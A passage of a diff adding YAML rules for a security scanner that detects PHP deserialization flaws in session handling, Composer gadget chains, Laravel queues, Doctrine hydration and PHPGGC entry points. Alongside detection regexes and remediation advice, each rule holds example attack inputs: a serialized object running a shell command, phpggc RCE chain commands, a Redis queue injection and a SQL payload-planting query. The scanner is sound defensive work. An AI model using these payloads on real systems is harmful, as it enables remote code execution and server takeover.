+    exploit_scenario:
+      attack_example: |
+        A session migration tool accepts base64-encoded session data via a
+        POST endpoint and calls session_decode(base64_decode($_POST['data']))
+        to restore the session. An attacker crafts a session-encoded string
+        containing a serialized object with a __wakeup method that executes
+        shell commands. The session handler uses php_serialize format, so the
+        attacker encodes: user|O:8:"Exploit":1:{s:3:"cmd";s:9:"id > /tmp/x";}
+        When session_decode processes this, it instantiates the Exploit object
+        and triggers __wakeup, executing the command.
+      example_payload: "user|O:8:\"Exploit\":1:{s:3:\"cmd\";s:9:\"id > /tmp/x\";}"
+      attacker_objective: "Inject malicious objects into PHP session through session_decode to achieve code execution via magic methods"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PHP-001"
+        - "DESER-PHP-006"
+
+  # ============================================================================
+  # DESER-PHP-005: Composer Autoloader Gadget Chains
+  # ============================================================================
+  - rule_id: "DESER-PHP-005"
+    title: "Composer Autoloader Exploitation via Deserialization Gadget Chains"
+    description: >
+      Detects conditions where PHP deserialization occurs in applications
+      using Composer autoloading, which dramatically expands the attack
+      surface for gadget chain exploitation. When Composer autoloading is
+      active (require 'vendor/autoload.php'), any class from any installed
+      package can be instantiated during deserialization. This means gadget
+      chains from popular packages like Monolog, Guzzle, Symfony, Doctrine,
+      Laravel, and PHPUnit become available. The presence of both
+      deserialization and Composer autoloading creates a high-risk
+      combination for PHP object injection attacks.
+    language: php
+    category: deserialization
+    severity: High
+    confidence: 0.86
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - php
+      - composer
+      - autoloader
+      - gadget-chain
+      - supply-chain
+      - monolog
+      - guzzle
+    detection_layer: 3
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'require.*vendor/autoload\.php.*unserialize'
+        description: "Composer autoload combined with unserialize in same file"
+      - type: regex
+        pattern: 'unserialize\s*\([^)]*\)(?=.*require.*vendor/autoload)'
+        description: "unserialize call in file that loads Composer autoloader"
+      - type: regex
+        pattern: '(monolog|guzzlehttp|symfony|doctrine|laravel).*unserialize'
+        description: "Gadget chain library name near unserialize usage"
+      - type: regex
+        pattern: 'unserialize\s*\(\s*\$.*(?!allowed_classes)'
+        description: "unserialize without allowed_classes in Composer project"
+      - type: regex
+        pattern: '"(monolog/monolog|guzzlehttp/guzzle|symfony/symfony|doctrine/orm)"'
+        description: "Known gadget chain packages in composer.json"
+      - type: regex
+        pattern: '__wakeup|__destruct|__toString|__call'
+        description: "Magic method definitions that may be gadget chain entry points"
+    anti_patterns:
+      - 'unserialize\s*\([^)]*allowed_classes["\x27]\s*=>\s*false'
+      - 'unserialize\s*\([^)]*allowed_classes["\x27]\s*=>\s*\[\s*\]'
+      - '\/\/\s*test'
+      - 'mock.*unserialize'
+      - 'json_decode.*instead.*unserialize'
+      - 'unserialize.*deprecated'
+      - 'unserialize.*internal.*only'
+      - 'unserialize.*trusted'
+      - 'unserialize.*signed'
+      - 'unserialize.*hmac'
+      - 'unserialize.*fixture'
+      - 'unserialize.*test_data'
+      - 'composer.*dev-only.*unserialize'
+    bypass_variants:
+      - description: "Monolog gadget chain through SyslogUdpHandler"
+        pattern: 'Monolog\\\\Handler\\\\(SyslogUdpHandler|BufferHandler|StreamHandler)'
+      - description: "Guzzle gadget chain through FnStream"
+        pattern: 'GuzzleHttp\\\\Psr7\\\\(FnStream|AppendStream)'
+      - description: "Symfony gadget chain through Process component"
+        pattern: 'Symfony\\\\Component\\\\Process\\\\Process'
+    evasion_indicators:
+      - "Large vendor directory with many potential gadget libraries"
+      - "Autoloader making all installed packages available for instantiation"
+      - "No allowed_classes restriction on unserialize"
+      - "Development dependencies accessible in production"
+      - "PHPGGC-cataloged gadget chains in dependencies"
+    encoding_variants:
+      - type: "base64_gadget"
+        pattern: 'base64_decode.*O:\d+:"(Monolog|Guzzle|Symfony|Doctrine)'
+      - type: "hex_gadget"
+        pattern: 'hex2bin.*4f3a\d+3a22(4d6f6e6f6c6f67|477a7a6c65)'
+      - type: "serialized_chain"
+        pattern: 'O:\d+:"[A-Z][a-zA-Z\\\\]+":\d+:\{.*O:\d+:"[A-Z]'
+    multi_function_chain_patterns:
+      - 'unserialize -> Monolog\Handler\BufferHandler.__destruct -> StreamHandler.write -> file write'
+      - 'unserialize -> Guzzle\FnStream.__destruct -> call_user_func -> system()'
+      - 'unserialize -> Symfony\Process.__destruct -> shell_exec -> RCE'
+      - 'unserialize -> Doctrine\DBAL\Connection.__destruct -> query execution'
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Composer autoloading makes all installed package classes available for gadget chain exploitation, dramatically expanding the deserialization attack surface"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "User input (any source)"
+        sink: "unserialize() with Composer autoloading active"
+        through: "Any decode/parse function"
+      - source: "HTTP request data"
+        sink: "Object magic method (__destruct/__wakeup/__toString)"
+        through: "unserialize -> Composer autoloaded class instantiation"
+      - source: "Cookie/session data"
+        sink: "Gadget chain entry point"
+        through: "unserialize with vendor classes available"
+    impact: |
+      Composer autoloader exploitation through deserialization can lead to:
+      - Remote Code Execution through dozens of known gadget chains
+      - File system manipulation (read/write/delete)
+      - SQL injection through ORM gadget chains
+      - SSRF through HTTP client gadget chains
+      - Complete server compromise via any of the 100+ PHPGGC chains
+    remediation: |
+      1. Use json_decode instead of unserialize for all user data.
+      2. If unserialize is required, use strict allowed_classes:
+         ```php
+         $data = unserialize($input, ['allowed_classes' => false]);
+         ```
+      3. Remove development dependencies in production:
+         ```bash
+         composer install --no-dev --optimize-autoloader
+         ```
+      4. Use PHPGGC for security audit of installed packages:
+         ```bash
+         phpggc -l  # List available chains for installed packages
+         ```
+      5. Implement runtime deserialization monitoring.
+    references:
+      - "https://github.com/ambionics/phpggc"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://www.ambionics.io/blog/php-generic-gadget-chains"
+    context_awareness:
+      surrounding_context_patterns:
+        - "Composer autoload.php require in bootstrap"
+        - "unserialize call in application code"
+        - "Known gadget chain packages in composer.json"
+        - "No allowed_classes restriction"
+      taint_source_indicators:
+        - "Any user-controlled input"
+        - "HTTP request data"
+        - "Cookie values"
+        - "Session data"
+        - "File upload content"
+      taint_sink_indicators:
+        - "unserialize()"
+        - "session_decode()"
+        - "phar:// metadata deserialization"
+        - "Magic method trigger"
+      sanitization_patterns:
+        - "allowed_classes => false"
+        - "json_decode replacement"
+        - "HMAC signed serialized data"
+        - "composer install --no-dev"
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (gadget_chain_count * 0.1)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A PHP application using Composer has Monolog, Guzzle, and Symfony
+        installed. An API endpoint calls unserialize($_POST['data']) without
+        allowed_classes restriction. An attacker uses PHPGGC to generate a
+        Monolog RCE chain:
+        phpggc Monolog/RCE1 system 'id' -s
+        This produces a serialized string that chains
+        BufferHandler.__destruct -> StreamHandler.write -> system('id').
+        The attacker sends the payload as POST data, achieving RCE.
+      example_payload: "phpggc Monolog/RCE1 system 'id > /tmp/pwned' --base64"
+      attacker_objective: "Exploit PHP object injection with Composer autoloader to leverage framework gadget chains for remote code execution"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PHP-001"
+        - "DESER-PHP-008"
+
+  # ============================================================================
+  # DESER-PHP-006: Laravel Queue Deserialization
+  # ============================================================================
+  - rule_id: "DESER-PHP-006"
+    title: "Laravel Queue Job Deserialization Enabling Remote Code Execution"
+    description: >
+      Detects vulnerabilities in Laravel queue job deserialization where
+      serialized job payloads from queue backends (Redis, SQS, Beanstalkd,
+      database) are deserialized using PHP's unserialize. Laravel queue
+      workers deserialize job payloads to reconstruct Eloquent models and
+      job classes. If the queue backend is compromised (e.g., exposed Redis)
+      or if job payloads can be tampered with, an attacker can inject
+      malicious serialized objects that exploit gadget chains in Laravel's
+      framework classes. CVE-2022-31279 demonstrated RCE through crafted
+      queue payloads in Laravel.
+    language: php
+    category: deserialization
+    severity: Critical
+    confidence: 0.87
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - php
+      - laravel
+      - queue
+      - redis
+      - job
+      - rce
+      - framework
+      - critical
+    detection_layer: 2
+    attack_surface_type: "internal"
+    patterns:
+      - type: regex
+        pattern: 'Queue::push\s*\(\s*unserialize\s*\('
+        description: "Queue push with unserialize in same call"
+      - type: regex
+        pattern: 'unserialize\s*\(\s*\$this->job->getRawBody'
+        description: "Job body deserialization in queue worker"
+      - type: regex
+        pattern: 'QUEUE_CONNECTION\s*=\s*["\x27]redis["\x27]|QUEUE_DRIVER\s*=\s*["\x27]redis["\x27]'
+        description: "Redis queue connection (commonly exposed)"
+      - type: regex
+        pattern: 'CallQueuedHandler|HandleQueuedCommand|Queue\\SerializesModels'
+        description: "Laravel queue handling classes that use serialization"
+      - type: regex
+        pattern: 'SerializesModels|SerializesAndRestoresModelIdentifiers'
+        description: "Laravel trait enabling model serialization in queue jobs"
+      - type: regex
+        pattern: 'dispatch\s*\(\s*unserialize\s*\('
+        description: "Dispatching a deserialized job object"
+      - type: regex
+        pattern: 'Queue::(later|pushOn|bulk)\s*\('
+        description: "Queue operations that serialize job payloads"
+    anti_patterns:
+      - 'QUEUE_CONNECTION\s*=\s*["\x27]sync["\x27]'
+      - 'REDIS_PASSWORD\s*=\s*["\x27][^\x27"]{16,}'
+      - '\/\/\s*test'
+      - 'mock.*Queue'
+      - 'Queue.*test'
+      - 'Queue.*internal'
+      - 'REDIS_HOST\s*=\s*["\x27](localhost|127\.0\.0\.1)["\x27]'
+      - 'Queue.*signed'
+      - 'Queue.*encrypted'
+      - 'Queue.*hmac'
+      - 'Queue.*validated'
+    bypass_variants:
+      - description: "Tampered Redis queue payload with gadget chain"
+        pattern: 'redis-cli.*LPUSH.*queues.*O:\d+'
+      - description: "Queue payload injection through exposed Redis"
+        pattern: 'REDIS_HOST\s*=\s*["\x27]0\.0\.0\.0["\x27]|REDIS_HOST.*\$_ENV'
+      - description: "Database queue with SQL injection for payload tampering"
+        pattern: 'QUEUE_CONNECTION\s*=\s*["\x27]database["\x27].*jobs.*payload'
+    evasion_indicators:
+      - "Exposed Redis instance used for queue backend"
+      - "Queue job payloads contain serialized PHP objects"
+      - "No authentication on Redis queue connection"
+      - "Database queue with injectable payload column"
+      - "SQS queue with tampered message body"
+    encoding_variants:
+      - type: "json_wrapped_serialized"
+        pattern: '"data"\s*:\s*\{[^}]*"command"\s*:\s*"O:\d+'
+      - type: "base64_queue"
+        pattern: '"command"\s*:\s*"[A-Za-z0-9+/=]+".*base64'
+      - type: "compressed_queue"
+        pattern: 'gzuncompress.*queue.*payload'
+    multi_function_chain_patterns:
+      - "Exposed Redis -> LPUSH queue payload -> queue worker -> unserialize -> RCE"
+      - "SQL injection -> jobs table -> payload column -> queue worker -> deserialization"
+      - "SQS message tampering -> queue worker -> unserialize -> gadget chain"
+      - "Queue job serialization -> Redis pub/sub -> worker deserialization -> exploit"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Compromised queue backend (e.g., exposed Redis) allows injection of malicious serialized jobs that execute with the queue worker's privileges"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Redis queue (if exposed)"
+        sink: "Queue worker unserialize"
+        through: "LPUSH to queue key"
+      - source: "Database jobs table (if injectable)"
+        sink: "Queue worker deserialization"
+        through: "Payload column modification"
+      - source: "SQS message"
+        sink: "Laravel queue worker"
+        through: "Message body with serialized command"
+    impact: |
+      Laravel queue deserialization exploitation can lead to:
+      - Remote Code Execution on queue worker processes
+      - Background job manipulation and injection
+      - Data corruption through tampered job payloads
+      - Privilege escalation via crafted job objects
+      - Persistent backdoor through recurring malicious queue jobs
+    remediation: |
+      1. Secure Redis with authentication and network restrictions:
+         ```env
+         REDIS_PASSWORD=strong_random_password_here
+         REDIS_HOST=127.0.0.1
+         ```
+      2. Use encrypted and signed queue payloads (Laravel 8+):
+         ```php
+         // In queue job class
+         class ProcessPayment implements ShouldQueue, ShouldBeEncrypted
+         {
+             use SerializesModels;
+         }
+         ```
+      3. Restrict network access to queue backends.
+      4. Use database queue with parameterized queries.
+      5. Implement queue job HMAC verification at the worker level.
+    references:
+      - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31279"
+      - "https://laravel.com/docs/queues"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "Laravel queue configuration"
+        - "Redis connection without authentication"
+        - "SerializesModels trait usage"
+        - "Queue worker processing serialized jobs"
+      taint_source_indicators:
+        - "Redis queue payload"
+        - "Database jobs.payload column"
+        - "SQS message body"
+        - "Beanstalkd job data"
+      taint_sink_indicators:
+        - "Queue worker unserialize"
+        - "CallQueuedHandler.call()"
+        - "Job::dispatch()"
+        - "SerializesModels restoration"
+      sanitization_patterns:
+        - "Redis authentication (requirepass)"
+        - "ShouldBeEncrypted interface"
+        - "Network segmentation for queue backend"
+        - "Queue payload HMAC signing"
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (redis_exposed ? 1.5 : 0.7)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Laravel application uses Redis for queue processing. The Redis
+        instance is accessible on the network without authentication. An
+        attacker connects to Redis and pushes a crafted job payload to the
+        queue:
+        LPUSH queues:default '{"job":"Illuminate\\Queue\\CallQueuedHandler@call",
+        "data":{"command":"O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":...
+        [PHPGGC Laravel/RCE chain]..."}}'
+        When the queue worker picks up this job, it deserializes the command
+        property, triggering the Laravel gadget chain for RCE with the
+        queue worker's system privileges.
+      example_payload: "LPUSH queues:default '{\"job\":\"CallQueuedHandler@call\",\"data\":{\"command\":\"[PHPGGC Laravel/RCE1 payload]\"}}'"
+      attacker_objective: "Inject malicious serialized PHP objects into Laravel queue to achieve RCE when the queue worker deserializes the job"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PHP-001"
+        - "DESER-PHP-005"
+        - "DESER-PHP-008"
+
+  # ============================================================================
+  # DESER-PHP-007: Doctrine ORM Object Hydration
+  # ============================================================================
+  - rule_id: "DESER-PHP-007"
+    title: "Doctrine ORM Object Hydration with Untrusted Data"
+    description: >
+      Detects Doctrine ORM object hydration patterns where user-controlled
+      data is used to hydrate entity objects without proper validation.
+      Doctrine's ObjectHydrator and custom hydration modes can reconstruct
+      entity objects from database results or external data. When combined
+      with PHP's type juggling and Doctrine's proxy object mechanism,
+      attacker-controlled data can lead to unexpected object instantiation,
+      lazy-loading proxy exploitation, and in certain configurations,
+      deserialization of stored serialized column data. Doctrine entities
+      with lifecycle callbacks (PostLoad, PrePersist) can amplify the
+      impact of object injection.
+    language: php
+    category: deserialization
+    severity: High
+    confidence: 0.82
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - php
+      - doctrine
+      - orm
+      - hydration
+      - entity
+      - object-injection
+    detection_layer: 3
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'getResult\s*\(\s*Query::HYDRATE_OBJECT\s*\).*\$(data|input|user|request)'
+        description: "Doctrine query result hydration with user-influenced result"
+      - type: regex
+        pattern: 'type\s*=\s*["\x27](object|array|json_array)["\x27].*\$_(GET|POST|REQUEST)'
+        description: "Doctrine column type with object/array deserialization from user input"
+      - type: regex
+        pattern: '@ORM\\\\Column\s*\(\s*type\s*=\s*["\x27]object["\x27]'
+        description: "Doctrine entity column of type object (uses unserialize)"
+      - type: regex
+        pattern: '@ORM\\\\Column\s*\(\s*type\s*=\s*["\x27]array["\x27]'
+        description: "Doctrine entity column of type array (uses unserialize)"
+      - type: regex
+        pattern: 'AbstractHydrator|ObjectHydrator|ArrayHydrator'
+        description: "Doctrine hydration classes"
+      - type: regex
+        pattern: 'EntityManager::merge\s*\(\s*unserialize\s*\('
+        description: "EntityManager merge with unserialized object"
+      - type: regex
+        pattern: '@ORM\\\\(PostLoad|PrePersist|PostPersist).*function\s+\w+\s*\('
+        description: "Doctrine lifecycle callbacks that may be triggered during hydration"
+    anti_patterns:
+      - '\/\/\s*test'
+      - 'mock.*EntityManager'
+      - 'type\s*=\s*["\x27](string|integer|boolean|float|text|datetime)["\x27]'
+      - 'Doctrine.*internal'
+      - 'Doctrine.*fixture'
+      - '@ORM\\\\Column.*type.*json'
+      - 'sanitize.*merge'
+      - 'validate.*hydrat'
+      - 'DTO.*Doctrine'
+      - 'Doctrine.*trusted'
+      - 'EntityManager.*mock'
+      - 'HYDRATE_SCALAR'
+    bypass_variants:
+      - description: "Doctrine proxy class exploitation through lazy loading"
+        pattern: '__Proxy__.*__load|Proxy.*__wakeup'
+      - description: "Doctrine type object column with injectable serialized data"
+        pattern: "type\\s*=\\s*[\"\\x27]object[\"\\x27].*INSERT.*INTO"
+      - description: "Custom Doctrine type with unsafe deserialization"
+        pattern: 'convertToPHPValue\s*\([^)]*\)\s*\{[^}]*unserialize'
+    evasion_indicators:
+      - "Doctrine entity with object/array column types"
+      - "Custom Doctrine type using unserialize in convertToPHPValue"
+      - "Lifecycle callbacks executing on hydrated objects"
+      - "EntityManager.merge with externally sourced entity"
+      - "Proxy objects loaded from tampered database records"
+    encoding_variants:
+      - type: "serialized_column"
+        pattern: 'type\s*=\s*["\x27]object["\x27].*O:\d+:'
+      - type: "base64_column"
+        pattern: 'convertToPHPValue.*base64_decode.*unserialize'
+      - type: "json_mixed"
+        pattern: 'type\s*=\s*["\x27]json["\x27].*__class'
+    multi_function_chain_patterns:
+      - "SQL injection -> object column update -> Doctrine hydration -> __wakeup -> RCE"
+      - "API input -> entity merge -> lifecycle callback -> side effect"
+      - "Database record -> Doctrine hydration -> proxy __load -> lazy loading chain"
+      - "Tampered data -> custom type convertToPHPValue -> unserialize -> gadget"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Doctrine object/array column types use PHP unserialize internally. If database content is attacker-influenced, hydration becomes an RCE vector"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Database column with serialized data (tampered via SQL injection)"
+        sink: "Doctrine ObjectHydrator -> unserialize"
+        through: "Query result hydration"
+      - source: "API input for entity merge"
+        sink: "EntityManager->merge()"
+        through: "Direct entity construction from input"
+      - source: "Custom Doctrine type conversion"
+        sink: "convertToPHPValue -> unserialize"
+        through: "Database read"
+    impact: |
+      Doctrine ORM hydration exploitation can lead to:
+      - Object injection through serialized column types (object/array)
+      - Remote Code Execution via gadget chains during hydration
+      - Data manipulation through lifecycle callback abuse
+      - Privilege escalation via proxy class exploitation
+      - Indirect SQL injection through type conversion
+    remediation: |
+      1. Avoid Doctrine object/array column types. Use JSON type instead:
+         ```php
+         /**
+          * @ORM\Column(type="json")
+          */
+         private array $settings = [];
+         ```
+      2. Use DTOs instead of directly hydrating entities from user input:
+         ```php
+         $dto = new UserDTO($request->all());
+         $validator->validate($dto);
+         $entity = $mapper->toEntity($dto);
+         ```
+      3. Validate all data before EntityManager.merge().
+      4. Implement custom Doctrine types using json_decode instead of unserialize.
+      5. Review lifecycle callbacks for security implications.
+    references:
+      - "https://www.doctrine-project.org/projects/doctrine-orm/en/latest/reference/basic-mapping.html"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "Doctrine entity with object/array column type"
+        - "EntityManager.merge with external data"
+        - "Custom Doctrine type using unserialize"
+        - "Lifecycle callbacks on entity class"
+      taint_source_indicators:
+        - "API request data"
+        - "Database column (if tamperable)"
+        - "External entity data for merge"
+        - "Import/migration data"
+      taint_sink_indicators:
+        - "Doctrine hydration"
+        - "convertToPHPValue"
+        - "EntityManager->merge()"
+        - "Lifecycle callback execution"
+      sanitization_patterns:
+        - "JSON column type instead of object/array"
+        - "DTO pattern for input handling"
+        - "Input validation before merge"
+        - "Custom type using json_decode"
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (object_column_present ? 1.3 : 0.7)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Doctrine entity has a preferences column of type "object" which
+        uses PHP unserialize internally. An attacker discovers a SQL injection
+        in another part of the application and uses it to update the
+        preferences column with a serialized PHP gadget chain payload.
+        When a legitimate user's profile is loaded, Doctrine hydrates the
+        entity and deserializes the preferences column, triggering the
+        gadget chain and executing arbitrary code on the server.
+      example_payload: "UPDATE users SET preferences = 'O:40:\"Illuminate\\\\Broadcasting\\\\PendingBroadcast\":...' WHERE id = 1"
+      attacker_objective: "Inject serialized PHP objects into Doctrine object-type columns to achieve code execution during entity hydration"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PHP-001"
+        - "DESER-PHP-005"
+
+  # ============================================================================
+  # DESER-PHP-008: PHPGGC Gadget Chain Entry Points
+  # ============================================================================
+  - rule_id: "DESER-PHP-008"
+    title: "PHPGGC Gadget Chain Entry Points in Application Code"
+    description: >
+      Detects code patterns that serve as entry points for PHP Generic
+      Gadget Chains (PHPGGC). This rule identifies classes and methods
+      commonly found in popular PHP frameworks and libraries that are
+      used as initial links in deserialization gadget chains. The rule
+      targets magic methods (__destruct, __wakeup, __toString, __call,
+      __get, __set) in classes from Laravel, Symfony, Monolog, Guzzle,
+      Doctrine, SwiftMailer, and other widely-used packages that are
+      documented in the PHPGGC repository as exploitable gadget chains.
+    language: php
+    category: deserialization
+    severity: High
+    confidence: 0.84
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - php
+      - phpggc
+      - gadget-chain
+      - magic-methods
+      - rce
+      - framework
+    detection_layer: 3
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'class\s+\w+[^{]*\{[^}]*function\s+__destruct\s*\(\s*\)\s*\{[^}]*(exec|system|passthru|shell_exec|popen|proc_open|eval|assert|call_user_func|file_put_contents)'
+        description: "Class with __destruct method containing dangerous function calls"
+      - type: regex
+        pattern: 'class\s+\w+[^{]*\{[^}]*function\s+__wakeup\s*\(\s*\)\s*\{[^}]*(exec|system|eval|file_put_contents|include|require)'
+        description: "Class with __wakeup containing dangerous function calls"
+      - type: regex
+        pattern: 'class\s+\w+[^{]*\{[^}]*function\s+__toString\s*\(\s*\)\s*\{[^}]*(file_get_contents|include|require|\$this->\w+->\w+\s*\()'
+        description: "Class with __toString enabling chain-through calls"
+      - type: regex
+        pattern: 'class\s+\w+[^{]*\{[^}]*function\s+__call\s*\([^)]*\)\s*\{[^}]*(call_user_func|call_user_func_array|\$this->\w+\s*\()'
+        description: "Class with __call enabling dynamic method invocation"
+      - type: regex
+        pattern: 'PendingBroadcast|PendingCommand|PendingDispatch'
+        description: "Laravel Pending* classes known as PHPGGC gadget entry points"
+      - type: regex
+        pattern: 'Monolog\\\\Handler\\\\(SyslogUdpHandler|BufferHandler|FingersCrossedHandler|StreamHandler)'
+        description: "Monolog handler classes used in PHPGGC chains"
+      - type: regex
+        pattern: 'GuzzleHttp\\\\Psr7\\\\(FnStream|AppendStream|CachingStream)'
+        description: "Guzzle stream classes used in PHPGGC chains"
+      - type: regex
+        pattern: 'Symfony\\\\Component\\\\(Process\\\\Process|Routing\\\\Loader|Cache\\\\Adapter)'
+        description: "Symfony component classes used in PHPGGC chains"
+    anti_patterns:
+      - '\/\/\s*test'
+      - 'mock.*gadget'
+      - '@codeCoverageIgnore'
+      - '\/\/\s*phpggc.*detection'
+      - '__destruct.*log.*close'
+      - '__destruct.*unset.*resource'
+      - '__destruct.*cleanup'
+      - '__wakeup.*reconnect'
+      - '__wakeup.*initialize'
+      - '__wakeup.*validate'
+      - 'final\s+class'
+      - '__wakeup.*throw'
+      - '__destruct.*debug.*log'
+    bypass_variants:
+      - description: "Multi-step gadget chain through nested object properties"
+        pattern: '\$this->\w+->\w+->\w+\s*\('
+      - description: "Dynamic property access chain enabling arbitrary method calls"
+        pattern: '\$this->\{\$this->\w+\}\s*\(\s*\$this->\w+'
+      - description: "Closure-based gadget leveraging Closure::fromCallable"
+        pattern: 'Closure::fromCallable\s*\(\s*\[\s*\$this->\w+\s*,\s*\$this->\w+'
+    evasion_indicators:
+      - "Magic method with indirect dangerous function calls through property chains"
+      - "Closure or callback stored in object property invoked during deserialization"
+      - "Multiple framework-specific gadget classes in vendor directory"
+      - "Dynamic method dispatch through __call or __callStatic"
+      - "Property chains leading to dangerous function invocations"
+    encoding_variants:
+      - type: "serialized_chain"
+        pattern: 'O:\d+:"[A-Z][a-zA-Z\\\\]+":\d+:\{.*s:\d+:"[a-z]";O:\d+'
+      - type: "phpggc_output"
+        pattern: 'phpggc\s+\w+/\w+\d+'
+      - type: "base64_chain"
+        pattern: 'base64_decode\s*\(\s*["\x27][A-Za-z0-9+/=]{100,}["\x27]\s*\)'
+    multi_function_chain_patterns:
+      - "PendingBroadcast.__destruct -> Dispatcher.dispatch -> call_user_func -> system()"
+      - "BufferHandler.__destruct -> StreamHandler.write -> file_put_contents -> webshell"
+      - "FnStream.__destruct -> close() -> call_user_func -> exec()"
+      - "Process.__destruct -> stop -> terminate -> proc_terminate"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "PHPGGC gadget chains convert PHP object injection into RCE, file write, SSRF, or SQL injection through framework magic method chains"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "unserialize() or phar:// with user-controlled data"
+        sink: "Gadget chain entry point (__destruct/__wakeup/__toString)"
+        through: "PHP object instantiation during deserialization"
+      - source: "Crafted serialized string"
+        sink: "Framework magic method"
+        through: "Autoloader-enabled class instantiation"
+      - source: "Cookie/session deserialization"
+        sink: "Gadget chain terminal (system/exec/file_put_contents)"
+        through: "Multi-hop property chain through framework classes"
+    impact: |
+      PHPGGC gadget chain exploitation leads to:
+      - Remote Code Execution through system()/exec()/eval()
+      - Arbitrary file write for webshell deployment
+      - Arbitrary file read for sensitive data extraction
+      - Server-Side Request Forgery through HTTP client gadgets
+      - SQL injection through ORM gadget chains
+      - Complete server compromise through chained operations
+    remediation: |
+      1. Prevent deserialization of untrusted data (root cause):
+         ```php
+         // Use json_decode instead of unserialize
+         $data = json_decode($input, true);
+         ```
+      2. Use allowed_classes to prevent gadget chain class instantiation:
+         ```php
+         $data = unserialize($input, ['allowed_classes' => false]);
+         ```
+      3. Remove unused framework packages to reduce gadget surface:
+         ```bash
+         composer remove unused/package
+         composer install --no-dev
+         ```
+      4. Audit magic methods in application code:
+         ```bash
+         grep -rn '__destruct\|__wakeup\|__toString\|__call' src/
+         ```
+      5. Implement runtime deserialization monitoring (e.g., Snuffleupagus).
+    references:
+      - "https://github.com/ambionics/phpggc"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://www.ambionics.io/blog/php-generic-gadget-chains"
+    context_awareness:
+      surrounding_context_patterns:
+        - "Magic method definitions in framework classes"
+        - "Object property chain leading to dangerous function"
+        - "Known PHPGGC gadget chain classes in vendor"
+        - "unserialize or phar deserialization in application"
+      taint_source_indicators:
+        - "unserialize() call"
+        - "phar:// metadata deserialization"
+        - "session_decode()"
+        - "Any PHP deserialization entry point"
+      taint_sink_indicators:
+        - "system()"
+        - "exec()"
+        - "eval()"
+        - "file_put_contents()"
+        - "call_user_func()"
+        - "proc_open()"
+      sanitization_patterns:
+        - "allowed_classes => false"
+        - "No unserialize of user data"
+        - "Vendor audit for gadget classes"
+        - "Snuffleupagus PHP extension"
+    severity_scoring:
+      severity_weight: 8
